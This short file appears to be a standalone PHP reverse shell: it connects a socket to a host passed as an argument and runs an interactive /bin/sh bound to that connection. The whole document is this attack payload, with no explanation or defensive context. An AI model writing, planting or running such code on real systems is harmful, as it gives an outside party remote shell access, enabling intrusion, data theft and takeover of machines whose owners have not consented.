<?php
$sock=fsockopen($argv[1],22);exec("/bin/sh -i <&3 >&3 2>&3");?>
